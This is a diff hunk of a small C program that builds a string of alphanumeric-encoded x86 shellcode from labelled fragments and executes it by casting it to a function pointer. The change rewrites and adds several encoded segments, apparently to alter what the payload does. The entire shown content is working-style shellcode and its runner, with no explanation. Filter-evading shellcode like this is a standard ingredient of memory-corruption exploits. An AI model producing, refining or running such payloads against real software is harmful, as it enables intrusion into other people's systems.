@@ -25,9 +25,11 @@ int main(void) {
                       "PZ"                                                      // P2    
                       "R"                                                       // P3
                       "j0X5JCCX5Ul00P"                                          // P4
-                      "j0X5JRYY5U007P"                                          // P5
-                      "Tj0X5kOOOP"                                              // P6
-                      "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH";               // P0
+                      "j0X5JRYY5U007PT"                                         // P5
+                      "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH5CG005q800P"  // P6
+                      "j0X5kOOOPP"                                              // P7
+                      "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"                // P8
+                      "DDDDDDDDDDDD";                                               //P9
 
     (*(void(*)()) shellcode)();
 }
